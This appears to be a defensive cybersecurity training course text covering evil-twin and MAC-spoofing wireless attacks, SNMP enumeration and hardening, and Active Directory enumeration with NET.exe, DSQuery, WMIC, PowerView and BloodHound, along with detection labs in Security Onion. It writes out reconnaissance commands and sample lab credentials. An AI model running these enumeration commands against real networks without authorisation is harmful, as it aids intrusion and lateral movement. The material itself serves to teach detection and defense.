![image](https://github.com/user-attachments/assets/75dacd55-63d9-4f31-a98a-55c7b2c5cb46)

----------------------------------------------------------

Wireless Sniffing | Active Sniffing Techniques
Evil Twin Attack
﻿
Also known as the Rogue Access Point attack, this type of active technique augments wireless sniffing reconnaissance by capturing all sides of a conversation and proxying the traffic. This attack occurs when the threat adversary stands up an alternative WAP with the same SSID as the original legitimate access point. When an unwitting user believes that they are connecting to a known wireless network with the familiar SSID, all their requests are first sniffed and captured by the malicious device. This technique can be combined with DNS Cache Poisoning to direct users to malicious web domains where additional valuable data is sniffed. 

﻿

MAC Spoofing
﻿
MAC Spoofing is a useful technique for gaining access to a wireless network that is protected by a captive portal or some other form of network authentication that whitelists clients by MAC address. The attacker first alters their own machine's MAC address to emulate a known whitelisted device, then sends a stream of deauthentication packets to the target device so as to break the connection between that device and the access point on the client's end, thus stealing that network connection. Having achieved access to the network, the attacker can then continue in further reconnaissance, additional active sniffing measures, or continue passively sniffing traffic.

![image](https://github.com/user-attachments/assets/c1a06d22-7852-47d1-8e3d-32e3361aba2e)


-----------------------------------------------------------

Defenses Against Wireless Sniffing
The strongest defense against a Malicious Cyber Actor (MCA) eavesdropping on a mission partner's wireless communications is secure network implementation and administration. There are several key principles to consider when administering wireless networks.

﻿

Signal Strength
﻿
Since any device attempting to sniff a mission partner's wireless traffic must be able to receive the signals as they are transmitted from the WAP, reducing the coverage of the wireless network to only the necessary physical footprint of users that should access it is ideal. In this way, the wireless signals do not travel further than required. This signal strength is modulated by adjusting the power used by the transmitting WAP. A wireless signal that is too strong can lead to extended range that attacker may be able to access, for example from a coffee shop across the street.

﻿

Encryption
﻿
Encrypted communications is the bedrock on which the assurance of security is based. There have been several technologies developed since the advent of wireless networking to employ encryption to radio communications. These technologies have employed either stream ciphers, which encode plaintext messages bit-by-bit, or block ciphers, which encode data in fixed-size blocks to secure wireless traffic.

﻿

Wireless Encryption Protocol
﻿

Wireless Encryption Protocol (WEP) was the first attempt at securing wireless networks. Users realized that using a WAP in the clear caused gratuitous data loss to even non-savvy attackers. These attackers could connect to a network, turn on promiscuous mode, and steal login credentials, credit card numbers, and other private information. WEP was the first specification developed to encrypt wireless data and employs Rivest Cipher 4 (RC4) stream cipher encryption, though its use of the same key for all traffic has proven to be as insecure as transmitting in plaintext — an attacker needs fewer than 10 minutes of traffic monitoring to break the WEP key and read all captured traffic. This is largely due to the small Initialization Vector (IV) size of 24 bits. This random value serves as the starting point for the encryption of each individual frame and can easily be reused after a few hundred web requests in a crowded network. Once the adversary has two different frames with the same IV encrypted by the same static key, breaking the key is simple and the entirety of sniffed traffic is available to them. 

﻿

Wi-Fi Protected Access
﻿

When WEP was identified to be such a flawed standard, the wireless industry developed Wi-Fi Protected Access (WPA), which continues to employ the RC4 method for encryption, but instead applies that encryption in the stronger Temporal Key Integrity Protocol (TKIP). TKIP uses a larger keysize than WEP, a larger IV size, and employs a simple Message Integrity Check (MIC) to improve confidence in secure communication. Additionally, the key is dynamic — it changes for each packet, which solves another problem that WEP presented. The only way to potentially break WPA from sniffing the traffic is to capture the original authentication handshake and hope that the master key is small.

﻿

WPA2
﻿

In the second iteration of the WPA standard, the TKIP method was replaced with the Advanced Encryption Standard (AES)-based Counter Mode Cipher Block Chaining Message Authentication Code Protocol (CCMP). This encryption method employs the strongest accepted block cipher rather than the RC4 stream cipher and includes improved message integrity checking both encrypted and unencrypted data in communications.

﻿

When WPA2 is configured with a Pre-Shared Key (PSK), a single American Standard Code for Information Interchange (ASCII) password or passphrase is provided to the WAP and to any client devices that need to connect to it. This shared secret is only as strong as the trust in the users employing it. For this reason, this form of authentication is more commonly used in residential or public Wi-Fi environments, while 802.1x is preferred for enterprise networks.

﻿

Authentication
﻿

802.1x with Extensible Authentication Protocol – Transport Layer Security (EAP-TLS)
﻿

802.1x is a form of centralized network authentication in which a supplicant (client device) requests access to the network itself, then follows an authentication process that occurs at a dedicated authentication server, usually a Remote Authentication Dial-In User Service (RADIUS) server. In this model, the WAP is the authenticator device. This form of network authentication vastly increases the security of a wireless network obscuring all traffic behind encryption after the initial authentication handshake.

﻿

Authentication Handshake
﻿

When 802.1x authentication is not employed, authenticating to an access point utilizing WPA to communicate over the network is a four-step process. This process assumes the use of a master PSK. 

﻿

The master PSK can be used to create several derivative keys that are used in subsequent communications. It is important to understand these definitions of those subsequent keys:

Pairwise Master Key (PMK): The master key derived from the PSK for connections between a WAP and client device.
Pairwise Transit Key (PTK): The connection-specific key for all unicast communication between a WAP and client device.
Group Master Key (GMK): The master key derived from the PSK for broadcasts between a WAP and any client device.
Group Temporal Key (GTK): The connection-specific key for all multicast communication from a WAP.
ANonce: A connection-specific random value created by the WAP (authenticator).
SNonce: A connection-specific random value created by the client (supplicant).
Using these values, the temporal keys are created through a pseudorandom function that uses the PMK or GMK, ANonce, SNonce, client MAC address, and WAP MAC address. 

﻿

When the client initiates an authentication request, the following four-way handshake allows the exchange of the necessary keys.

﻿

1. The WAP provides the client with the ANonce used to create the PTK.

2. The client provides the WAP with the SNonce, encrypted with the PTK.

3. The WAP provides the client with the GTK, encrypted with the PTK.

4. The client confirms receipt of the GTK, encrypted with the PTK.

﻿

At this point, the client can encrypt and decrypt all unicast traffic with the PTK and encrypt and decrypt all multicast traffic with the GTK.

﻿

Virtual Private Networks
﻿

Virtual Private Networks (VPN) are a secure tunneling solution that allow encrypted access to trusted mission partner networks even when not physically connected to it. These solutions are essential for remote workers that may be using publicly available or even private wireless networks to access mission partner resources, because even if the rest of the infrastructure is secure, if a remote worker accesses sensitive material insecurely, then that material may be sniffed over the insecure wireless network.

![image](https://github.com/user-attachments/assets/1f829cf6-cefb-4443-b9a1-290072c93a84)

![image](https://github.com/user-attachments/assets/f06cb074-5582-46a9-b1a8-f8a044724e10)


-------------------------------------------------------------

Practical Defenses | Detecting Rogue Access Points

-------------------------------------------------------------

Practical Defenses | Detecting Rogue Access Points
Workflow

﻿

NOTE: The following steps continue from the previous task.

﻿

5. Observe that the device with BSSID 00:0f:66:05:a9:11 is transmitting wireless management packets with the same SSID PublicLibrary as the legitimate access point. 

﻿![image](https://github.com/user-attachments/assets/cf49eef3-b2ec-4da5-ab16-386575d45f3d)

This device is successfully emulating the legitimate PublicLibrary access point. Any device that connects to this rogue access point — even though they may experience uninterrupted service — are likely to have their entire communication captured by the attacker.

-----------------------------------------------

########## M6 L4 ############
######### SNMP Enumeration ###########

SNMP Overview
SNMP is a management protocol used to monitor and manage network devices. Most networking devices and components — including routers, switches, printers, servers, and workstations — support getting and setting various values associated with the configuration of the device. End-user devices and workstations are less likely to have SNMP turned on by default but may have it enabled through various methods, like group policy for Windows. SNMP is widely used by network administrators to monitor networking devices for items like bandwidth, uptime, temperature, errors, network connections, processes, routing tables, Address Resolution Protocol (ARP) tables, and additional values. A system that is configured to use SNMP is called a managed device. Managed devices use a service or software application — an agent — running on the device to interface with the device's internals and interact with a Network Management Station (NMS). An NMS consists of a terminal that uses SNMP to query and set various settings on managed devices, as well as receive device-originated push notifications. The various values that a device using SNMP provides to an NMS are contained in a Management Information Base (MIB), which describes the configuration and status of the local system. The agent translates the MIB values for use with SNMP.

﻿

Figure 6.4-1 shows a generalized concept of how an NMS and agent interact. Notice there are two main types of communication. Interactions that use the GET and SET SNMP commands can be uni-directional for setting values or bi-directional for queries. This communication occurs over User Datagram Protocol (UDP) port 161. Agents may also be configured to send unsolicited responses — using the TRAP command — to the NMS on UDP port 162 when certain thresholds are exceeded or on a periodic basis. This allows monitoring systems to get consistent updates on key variables and limits the amount of network traffic since the NMS does not send an explicit GET request.

﻿
![image](https://github.com/user-attachments/assets/6c5f62bb-5753-4574-9432-0bf839ab4ef9)

SNMP versions 1 and 2 use a community string — a text-based password — to separate read-only operations (typically indicated in configurations as ro) and set/write operations (typically rw or w). SNMP version 3 uses a user ID/password model for authentication instead of a community string. For decades, the default community strings have been the words public for read-only access and private for write access. Many networking devices still use these community strings by default. Network administrators often fail to change these community strings to something more secure, opening up these devices to provide sensitive information to anyone able to communicate with them using SNMP.


SNMP Versions


SNMP has three major versions of the protocol in use with various security and authentication implications relevant to defenders and system administrators. 


![image](https://github.com/user-attachments/assets/ef9b64fe-cd6a-4678-baed-7bc9dba05364)

Table 6.4-2 describes the types of SNMP command — or protocol data units — that are available for each version of the protocol. Commands that are in the SNMPv1 version are available for all versions.

![image](https://github.com/user-attachments/assets/95eb08d2-9a83-4f4d-babc-a9b60cf4bfdd)

SNMP Enumeration


Enumeration is the process of systematically counting or retrieving something. The MIB used for SNMP consists of Object Identifiers (OID) that identify each item in the MIB. OIDs are hierarchical in nature and follow a tree that is based on standards established by various international standards organizations, including the International Organization for Standardization (ISO), the National Institute of Standards and Technology (NIST), and the Internet Engineering Task Force (IETF). SNMP OIDs are typically displayed in a dot notation to indicate the specific node in the tree. For example, the dot notation 1.3.6.1.2.1 may also be described as:
{iso(1) identified-organization(3) dod(6) internet(1) mgmt(2) mib-2(1)}


![image](https://github.com/user-attachments/assets/0a9663ec-d54c-4f31-8973-995c12d85757)

This OID example refers to the branch in the tree that deals with the management of internet devices. The bulk of the MIB-2 specification (also sometimes seen as MIB-II) is based on the internet standards defined in Request for Comments (RFC) 1213 and RFC 3418 and defines the MIB for network management of Transmission Control Protocol (TCP)/Internet Protocol (IP)-based internets. SNMP enumeration is systematically requesting — or following — the subordinate OIDs in the agent's MIB to retrieve all available data. The further down — or deeper — into the tree, the more specific the information contained in the referenced node. A small excerpt of OIDs associated with a router is shown in Figure 6.4-3. 


![image](https://github.com/user-attachments/assets/d1b49e32-6c01-4c9b-9640-ce627c9121b7)


Notice that several OIDs were not decoded into a human-readable format. MIB repositories exist to assist in identifying the specific data held in an OID as vendors can define OIDs to hold a particular variable. Websites like oid-info.com compile the various standards-based and vendor-based MIBs and allow users to search for specific OIDs. Recall from Figure 6.4-2 that iso is the top-level node and can also be referenced with the number one. The OID repository at oid-info.com shows that the OID 1.3.6.1.2.1.10.131 is derived from RFC 4087 and is used to describe tunnel details.

![image](https://github.com/user-attachments/assets/b277a7e0-1c18-4f8e-a82e-72a623c8a7cb)


![image](https://github.com/user-attachments/assets/4b6899d1-63b8-4287-904a-af1a81021a2e)


------------------------------------------------------------------


SNMP Enumeration | Techniques
There are many tools that network and system administrators use to interact with agents/devices. Attackers often use the same tools as a mechanism to blend in with legitimate activity. Both open-source and commercial network monitoring suites exist with varying levels of automation and ease of use. Both snmpwalk and snmp-check are common Linux command-line utilities that use SNMP GETNEXT requests to query an agent for a tree of MIB values. snmpwalk can request only a portion of the MIB by specifying an OID space to start using GETNEXT requests — essentially a sub-tree. In the following lab, trainees use two CLIs to review examples of the data that networking devices may expose through SNMP.

---------------------------------------------------

Automated Tools

![image](https://github.com/user-attachments/assets/323e97fe-f7d8-467b-b883-cc163ec04637)

Figure 6.4-6 shows the output of snmp-check from ch-core-rtr and the interfaces assigned to a device are shown in the Network IP: section of the output.


The Command-Line utilities discussed are useful for interacting on a host-by-host basis but are less useful to administrators managing large enterprises with hundreds or thousands of devices. Many commercial network management tools exist that use SNMP to periodically poll the health of these devices. These tools provide Graphical User Interfaces (GUI) and use SNMP requests for specific details. They can also set and receive SNMP Trap commands from network devices. Using automation and common SNMP configuration, administrators can identify network faults, availability issues, and monitor critical performance metrics. Two examples of commercial automated SNMP management solutions are from the companies SolarWinds and ManageEngine. Like most commercial SNMP management solutions, both have GUIs to browse the entire MIB for the various supported devices as well as the ability to show different visualizations of the states of the managed devices. Most attackers use CLI tools to interact with SNMP, so the commercial solutions are not discussed further in this course. 


SNMP Defense


While SNMP can be very useful for administrators, that same data can provide attackers a plethora of useful configuration information to further exploit and move within a network. If SNMP is not used or needed within a network, the best defense is to disable or remove the SNMP agents.


In networks that need to use SNMP, the following considerations need to be taken:
Ensure community strings used with version 1, 1c, or basic v3 (no authentication or privacy) have read-only access and NOT write access.
Ensure any community strings configured for write access use SNMPv3 with authentication.
Safeguard community strings — devices often store community strings in plain text.
Use Virtual Local Area Networks (VLAN) and firewall rules to limit SNMP traffic to networking devices and a set list of permitted management hosts.
Explicitly block UDP ports 161 and 162 not associated with management hosts.
Use IP Security (IPSec) to encrypt and protect SNMP traffic.


---------------------------------------------------------

SNMP Analysis in Kibana
Analyzing SNMP activity in a network can be accomplished using a Security Information and Event Management (SIEM) like Security Onion using Kibana. In this scenario, the Cyber Protection Team (CPT) has been tasked to assist local defenders of the City Hall network. Threat intelligence indicates attackers may be using SNMP to gain detailed network configuration details in order to gain access and laterally move within similar city networks. City Hall administrators requested assistance due to the discovery of a router configuration posted on GitHub that contained the device's SNMP community string by accident and was publicly accessible. Local defenders have provided the following overview:

IP address space: 172.35.0.0/16

Public IP address: 104.53.222.32

Edge firewall: 156.74.85.2

Demilitarized Zone (DMZ): 172.35.3.0/24 (Network Address Translation [NAT] from ch-edge-rtr to public IP address)

SNMP: simspace community string, but not used by City Hall network administrators

A Deployable Mobile Support System (DMSS) kit has been attached to the City Hall core router using the 199.63.64.0/24 subnet

Take note of the above information and use it to analyze any SNMP activity in the following tasks.

-----------------------------------------------

Analyzing the Results
﻿
![image](https://github.com/user-attachments/assets/1e021973-2894-4f1e-ac79-35869044b8c5)

As is seen in Figure 6.4-9, at least five IP addresses were seen receiving SNMP requests. In order to see the full list, use a visualization to see the full list.


Use the information from the scenario to identify SNMP activity that is suspicious.


![image](https://github.com/user-attachments/assets/326b05fb-03cb-499c-aeb0-e8c9ca66cd21)

![image](https://github.com/user-attachments/assets/0af9fd86-2c22-44c6-944f-56629fa74031)

--------------------------------------------------

SNMP Enumeration Analysis

Two IP addresses originated SNMP requests in the time period: 128.0.7.205 and 199.63.64.51 — but since 199.63.64.51 is within the DMSS subnet range, 128.0.7.205 is likely associated with an attacker. It is the only source that is external to the network.

![image](https://github.com/user-attachments/assets/3050664e-7d2a-415a-a4c1-4e266fb1484c)

There is significant activity from the 199.63.64.51 IP address, which is internal to the DMSS kit subnet. When activity like this is discovered by defenders, communication is required to deconflict with the rest of the team to ensure that the activity is legitimate. Activity that originates from within an expected legitimate enclave still requires validation to ensure the security tools used by defenders have not themselves been compromised. 


The CPT team leader confirms the activity originating from 199.63.64.51 was other members of the team performing a survey and analysis of specific devices — this source can be filtered out as legitimate activity. Similarly known, SNMP management IP addresses can be filtered out as a part of a playbook to identify SNMP activity that may be suspicious.

--------------------------------------------------

SNMP Mitigation
SNMP agents are not installed or started by default on most Windows Operating Systems (OS). For Windows OSs, SNMP runs as a service and can be seen in the Services control panel. Disabling the SNMP service is one method to mitigate risk due to SNMP. Changing the community strings and restricting what hosts can reach the SNMP service are other ways to mitigate SNMP on Windows OSs. Routers and other networking devices are all different, but references to SNMP in the configuration files indicate if the agents are running. Mitigating these devices varies and the documentation should be consulted in order to ensure the appropriate configuration changes are made. The following workflow walks through the mitigation of SNMP on a Windows server.


Workflow


1. Log in to the ch-dc1 VM using the following credentials:
Username: trainee
Password: CyberTraining1!



2. Open the Services control panel and scroll down to SNMP Service.

![image](https://github.com/user-attachments/assets/b4a8b19d-0bf9-45da-9613-ef9c1f99262d)

In this case, the SNMP Service — the agent — is installed and running. The management service that would receive SNMP traps — SNMP Trap — is not running.


3. Open the SNMP Service properties, and select the Security tab:

![image](https://github.com/user-attachments/assets/25ea3a0e-504c-4e21-9773-af12f3fae827)

Notice the simspace community string is listed with read-only rights, and this system is configured to Accept SNMP packets from any host. Limiting SNMP to management IP addresses only is one way to mitigate risk, as well as ensuring there are no write SNMP community strings. Configuring the SNMP agent to send Traps is made on the Traps tab. Microsoft has deprecated the use of SNMP in Windows OSs, so there is no native support for SNMPv3 with authentication. The use of Windows Management Instrumentation (WMI) or Windows Remote Management (WinRM) tools are the preferred and supported methods for obtaining the configuration and performance data of other systems using SNMP.


4. Select the General tab, stop the service, and set the Startup type to be Disabled.

![image](https://github.com/user-attachments/assets/d30a3296-73b3-4a84-b6df-621e9920f36c)

5. Apply the changes, and select OK. 


The same steps can be used to disable the SNMP Trap service. While there is less risk from leaving the SNMP Trap service enabled, if it is not being used, the best practice is to remove or disable any services not intended to be used to reduce the potential attack surface. Group Policy Objects (GPO) can also be created to ensure the SNMP service is disabled or removed across Windows domains.

-----------------------------------------------------


########## M6 L5 ############
######### Active Directory Enumeration ###########

AD Enumeration Overview
AD enumeration is used by adversaries to gain information about an AD environment that can help them further their attack. The adversary needs access to a domain account before they can perform AD enumeration. This activity falls under the Discovery (TA0007) tactic of the MITRE ATT&CK® matrix.

﻿

Adversaries use both third-party tools and built-in system tools for AD enumeration.

﻿

Third-Party Tools
﻿

Numerous third-party tools have powerful AD enumeration capabilities. Such tools include the following:

BloodHound uses graph theory to help adversaries or defenders find complex attack paths in AD that they can then exploit or harden. This tool was used in CDA-Basic to enumerate an AD environment.

PowerSploit is composed of PowerShell modules that can be used to assist adversaries in all phases of their attack.

PowerView is a specific module within PowerSploit that adversaries can use for network and Windows domain enumeration and exploitation.

Built-in System Tools
﻿

Adversaries may also use built-in system tools (i.e., they may live off the land). Such tools include the following:

Directory Service Query (DSQuery) is a command-line utility that queries the objects in AD by employing user-specified search criteria.

AD PowerShell Module is a suite of PowerShell cmdlets that allow a user to query AD objects with Windows PowerShell. Some cmdlets in this suite used to gather information about a directory are as follows:

Get-AdUser

Get-AdDomain

Get-AdComputer

Get-AdGroup

Get-AdGroupMember

Get-AdObject

NET commands can be accessed through a Command-Line Interface (CLI) and are primarily used to manage network resources. However, adversaries may use NET commands to enumerate users, shares, computers, groups, local groups, and other AD objects.

Windows Management Instrumentation Command-Line (WMIC) can be used by adversaries to enumerate hosts. WMIC provides a utility usable through a CLI to do this. WMIC can be used to get information on processes, user accounts, and groups.

Enumeration is one of the most important steps of an attack. If it is performed well, it can provide an adversary valuable insights into how an AD environment is configured. It can also allow an adversary to find misconfigurations that leave the environment vulnerable to further exploitation.

﻿

This lesson focuses on the third-party tools BloodHound and PowerSploit and the built-in system tool NET.exe due to their wide use among adversaries.

![image](https://github.com/user-attachments/assets/1eb6e532-d5ee-4700-86e6-5c4680feb7aa)


﻿--------------------------------------

 AD Review
AD is a database that contains information about objects on a network. Some of these objects are Organizational Units (OU), users, groups, computers, and Access Control Lists (ACL). Adversaries can query the objects to potentially find attack paths to follow to gain greater access.

﻿

CDA-Basic Modules 14 and 15 included AD concepts. Some of these concepts are summarized below.

﻿

AD Concepts
Directory: Stores all the information about objects.
Objects: References most items inside a directory (e.g., user, group, shared folder).
Domain: Stores directory objects.
Tree: Domain with the same root (vcch.lan, file.vcch.lan).
Forest: Group of trees connected by a trust relationship.
AD Directory Service Key Terms
Schema: The set of user-configured rules that govern objects and attributes in AD Directory Service (DS).
Global Catalog: The container for all objects in AD DS. For example, a name associated with a user or a computer is stored in the Global Catalog.
Query and Index Mechanism: This system allows users to find each other in AD. A good example is typing a recipient's name in a mail client and the mail client showing possible matches.
Replication Service: The replication service ensures that every Domain Controller (DC) on the network has the same Global Catalog and Schema.
Sites: Representations of the network topology, so AD DS knows which objects go together to optimize replication and indexing.
Lightweight Directory Access Protocol (LDAP): A vendor-agnostic, industry-standard application protocol that allows AD to communicate with other LDAP-enabled directory services across platforms. An example of its use is creating centralized management of AD users for validating access to various applications and services.
﻿

AD DS Services
Domain Services: The collection of software and processes that store information about the enterprise, including users and computers.
Certificate Services: This allows the domain controller to serve and authenticate digital certificates, signatures, and public-key cryptography.
Lightweight Directory Services: The foundation that supports LDAP.
Directory Federation Services: Provides Single Sign-On (SSO) authentication for multiple applications in the same session. SSO allows users to use only one set of credentials to log in to multiple applications.
Rights Management: The rules and configurations that control information rights and data access policies. The configurations defined using this service determine which users can access which files, folders, and applications.

----------------------------------------------

AD Enumeration: Living off the Land
Living off the land is when an adversary uses tools already present on a system rather than downloading additional tools. Living off the land is stealthier than use of third-party tools because the system tools are likely the same tools the internal Information Technology (IT) and Security teams use for their jobs daily. This means the activity has a chance to blend in with normal noise that the Security Operations Center (SOC) often flags as false positive.

﻿

As mentioned before, several tools enable living off the land to perform AD enumeration. These tools typically do similar things, and the adversary will use whatever is available on the system.

﻿

As an example, an adversary could grab a list of users in the Domain Admins group using any one of the below system tools and their associated commands:

﻿

DSQuery

dsquery group -name "Domain Admins" | dsget group -members
AD PowerShell Module

Get-ADGroupMember -Identity "Domain Admins" 
NET.exe

net group "Domain Admins" /domain
WMIC

wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value

![image](https://github.com/user-attachments/assets/12e6796d-a1ef-4530-9eb6-87803015861a)

------------------------------------------------------------
AD Enumeration with NET.exe
The CPT has been assigned to a mission to audit an AD environment. A domain account has been provided to the CPT to assist local defenders. Enumerate the AD environment and identify misconfigurations that an adversary may be able to take advantage of.

﻿![image](https://github.com/user-attachments/assets/1e09ff8f-dc42-43c5-97e4-d1db72b2a43d)

----------------------------------------

AD Enumeration: Third-Party Tools
Although living off the land can provide greater stealth, the more advanced capabilities provided by third-party tools are often necessary for an adversary to develop more efficient attacks.

﻿

This section focuses on the third-party tools PowerSploit/PowerView and BloodHound/SharpHound for performing AD enumeration.

﻿

PowerSploit/PowerView
﻿

PowerSploit is a post-exploitation framework of PowerShell modules that assists adversaries in execution, enumeration, persistence, exfiltration, lateral movement, and privilege escalation. PowerView is part of the PowerSploit Recon module and is the only element of PowerSploit this lesson covers.

﻿

To pull all the available commands for the Recon module, run the following command:


Get-Command -Module Recon
﻿

NOTE: This command can be used with any PowerShell module by replacing Recon with the module of interest.

﻿

Whereas NET.exe requires specifying the system to look for shares, PowerView can find all shares on the network without specifying the systems to check.


Find-DomainShare
﻿


PowerView is able to do this by using the Find-DomainComputer function to compile a list of domain computers and then uses Get-NetShare against the list of computers to check for available shares on each system. This can save an adversary valuable time if many systems are on the domain.

﻿

Additional find functions are listed below. Use Get-Command -Module Recon for a full list of commands.

Find-DomainUserLocation: Finds domain machines specific users are logged into.

Find-DomainProcess: Finds domain machines where specific processes are currently running.

Find-DomainUserEvent: Finds logon events on the current (or remote) domain for the specified users.

Find-DomainShare: Finds reachable shares on domain machines.

Find-InterestingDomainShareFile: Searches for files matching specific criteria on readable shares in the domain.

Find-LocalAdminAccess: Finds machines on the local domain where the current user has local administrator access.

Find-DomainLocalGroupMember: Enumerates the members of the specified local group on machines in the domain.

BloodHound/SharpHound
﻿

BloodHound is a powerful tool with unique functions that the tools discussed thus far do not have. BloodHound can perform such actions as listing all the Domain Admins but also more advanced functions, such as finding the shortest path to Domain Admins. In addition, BloodHound displays all its findings in an easy-to-read graph rather than a wall of text. This lesson does not delve deeply into the use of BloodHound, as it was covered in the CDA-Basic course, but it does discuss how to detect usage of BloodHound's collector SharpHound in later sections.

﻿

The list below provides all the pre-built analytics queries that come with a default BloodHound install. These queries can be found in the BloodHound interface after importing a SharpHound export.

Find All Domain Admins

Find Shortest Paths to Domain Admins

Find Principals with DCSync Rights

Users with Foreign Domain Group Membership

Groups with Foreign Domain Group Membership

Map Domain Trusts

Shortest Paths to Unconstrained Delegation Systems

Shortest Paths from Kerberoastable Users

Shortest Paths to Domain Admins from Kerberoastable Users

Shortest Path from Owned Principals

Shortest Path to Domain Admins from Owned Principals

Shortest Paths to High Value Targets

Find Computers Where Domain Users Are Local Admin

Find Computers Where Domain Users Can Read LAPS Passwords

Shortest Paths from Domain Users to High Value Targets

Find All Paths from Domain Users to High Value Targets

Find Workstations Where Domain Users Can RDP

Find Servers Where Domain Users Can RDP

Find Dangerous Rights for Domain Users Groups

Find Kerberoastable Members of High Value Groups

List All Kerberoastable Accounts

Find Kerberoastable Users with Most Privileges

Find Domain Admin Logons to Non-Domain Controllers

Find Computers with Unsupported Operating Systems

Find Authentication Service Response Message (AS-REP) Roastable Users (DontReqPreAuth)
﻿
![image](https://github.com/user-attachments/assets/5bafc240-cffd-4227-9db8-13feb545cf1f)

-----------------------------------------------

Enumeration with PowerSploit (PowerView)
This lab demonstrates use of PowerSploit to find information on shares, users, and groups.

﻿

The CPT has been assigned to a mission to audit an AD environment.  Access to a technician's desktop has been provided to allow the team to perform AD enumeration in an attempt to find misconfigurations before an adversary does.

﻿

Workflow

﻿

1. Log in to the ch-tech-1 VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell.

﻿

3. Search the domain for shares.

PS C:\Users\trainee> Find-DomainShare
﻿

This command can require significant time to finish because it enumerates all the machines that have entries in AD.

﻿

NOTE: The order in which the systems are enumerated may differ from the screenshot.

﻿![image](https://github.com/user-attachments/assets/78d9a922-e5fa-4b78-85d7-386926e62c23)

PowerSploit/PowerView can use find cmdlets like Find-DomainShare to do the hard work of stringing commands together to complete a complex task. Find-DomainShare uses multiple commands to look for systems and check them for shares.


The search can be refined to return only shares to which the current account has read access and that exist in the vcch.lan domain.
PS C:\Users\trainee> Find-DomainShare -ComputerDomain vcch.lan -CheckShareAccess



The bkup share has been found on the ch-dc1 system, as it was in the NET.exe lab. Because this is the same share that was detected in the NET.exe lab, the contents of the user-list.txt file is provided below to save time.
helpdesk:p@ssw0rd
lewis:password!



4. Check the Domain Admins group to see if these users are members.
PS C:\Users\trainee> Get-NetGroup 'Domain Admins'


![image](https://github.com/user-attachments/assets/5cda04c9-f605-441f-8dfe-fde1da634908)

To check who is in the group, review the member list in the command output.


5. Look up more information on the users from the .txt file.
PS C:\Users\trainee> Get-NetUser helpdesk, lewis

![image](https://github.com/user-attachments/assets/1173098f-13cb-40ad-bcf6-2c4151c06335)

![image](https://github.com/user-attachments/assets/7142685a-8bc8-45b1-a7c8-4cf6c60cebc2)

This audit provided an example of how much more efficient third-party tools can be over built-in system tools. Specifically, PowerView's find commands automate much of the manual work an a  dversary would otherwise have to do.

![image](https://github.com/user-attachments/assets/538966a1-1986-4f36-826a-8b7a6c53550e)


-----------------------------------------

Hunting for AD Enumeration
AD enumeration can be detected using several methods. This section focuses on use of Windows Security logs, Sysmon, and PowerShell script block logs to detect living off the land activity performed using NET.exe and to detect such third-party tools as PowerView and SharpHound. 

﻿

NET.exe
﻿

To detect NET.exe activity, Security event ID 4688: A new process has been created or Sysmon ID 1: Process creation is used. These event codes show the exact command that was run by the adversary. Determination of malicious or normal activity is based largely on the type of account running a net group command. A non-admin account running a net group command to list all Domain Admins is quite suspicious, given that most users do not know how to do this. An admin running the command is much less suspicious, and more context would be needed to determine how malicious the activity is.

﻿

Another way to determine if NET.exe activity is suspicious is by examining its usage over time and creating a baseline. One red flag would be the observation that a certain user has not used the NET.exe command in the past 6 months but now they are enumerating Domain Admins and network shares. Time graphs can also be used to examine usage and determine if it is machine or human activity. Human activity is much more scattered than machine activity; machine activity usually has some semblance of structure to it. For example, if NET.exe is being run every hour, on the hour, automated machine activity — and perhaps an admin script — is likely occurring. This can be verified easily on a system by checking with the local admin or looking up the script or scheduled task that is triggering the activity.

﻿

The best tool is the analyst's mind. Get into the hacker's mindset, and filter everything analyzed through that lens.

﻿

In the labs that follow, this knowledge will be used to detect AD enumeration by running search queries in Security Onion.

﻿

PowerSploit/PowerView
﻿

PowerShell logs can be helpful when searching for PowerView activity. PowerShell Module logs (event ID 4103) and PowerShell Script Block logs (event ID 4104) can be used to gain valuable insights into an endpoint's PowerShell activity. PowerShell script block logging allows access to the full script being run, which can then be reverse engineered to understand what the adversary was doing. Such resources as Microsoft Ignite's articles on PowerShell provide more information on PowerShell logging, how to enable them, and how defenders can use them.

﻿

As discussed earlier, a baseline can be created to see what type of activity is normal. For example, most end users do not manually run PowerShell often. There may be cases where PowerShell is used as part of a login script, or used as part of expected normal activity — which can be excluded from analysis once identified as normal. Thus, searching for event codes 4103 and 4104 may return some spike in the timeline if a command like Find-DomainShare were run.

﻿

BloodHound/SharpHound
﻿

Multiple ways exist to detect SharpHound collection activity using client-side logs. SharpHound uses LDAP queries to perform the AD enumeration that collects the data to import into BloodHound for analysis. One way to detect SharpHound usage is to use Sysmon event ID 3 to look for several connections to TCP ports 389/636 (LDAP/LDAPS) and 445 (SMB). In addition, Sysmon event ID 18 can be used to look for several connections to named pipes srvsvc and lsass occurring at the same time as Sysmon event ID 3 events.

---------------------------------------------

Detecting NET.exe Usage
This lab covers techniques to detect AD enumeration performed with NET.exe.

﻿

The CPT has been assigned to a mission to hunt for AD enumeration using normal system tools. The time range is Oct 26, 2021 @ 14:00:00.000 → Oct 26, 2021 @ 15:00:00.000.

﻿

Workflow

﻿

1. Log in to the win-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Chrome.

﻿

3. Select the Discover - Elastic bookmark.

﻿

4. Log in to Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Run an empty search across the time range Oct 26, 2021 @ 14:00:00.000 → Oct 26, 2021 @ 15:00:00.000.

﻿

The results (indicated in the green box shown below) show nearly 65,000 logs — far too many to manually sift through.

![image](https://github.com/user-attachments/assets/d75bdc24-b99d-4a3d-9f57-eec59f5b0cf1)

6. Narrow the results by searching for Sysmon Event Code 1, the event identification (ID) that shows a process being created.
event.code: 1



The results (shown below) have been reduced significantly, but more than 1,000 logs are still too many to manually sift through.


The time chart in Figure 6.5-14 clearly shows some machine activity every 30 minutes from about time 14:05 to time 14:35.


![image](https://github.com/user-attachments/assets/0041ecda-f42a-4b4c-a75a-9a20f4d39bb9)

7. To make the data easier to analyze, search for the following fields in the Search field names box on the left. (In Figure 6.5-15, host.name is in the Search field names box.) Once the fields are listed under Available fields (see Figure 6.5-15), select the plus sign to the right of each field's name to add the field as a column.
host.name
user.name
process.command_line

![image](https://github.com/user-attachments/assets/eede48b1-1206-48b5-b89d-bb44136332d4)

Once all the fields have been added, the results appear, as Figure 6.5-16 shows:

![image](https://github.com/user-attachments/assets/157a6fc4-4b54-4a11-af4b-fdd0e9d60204)

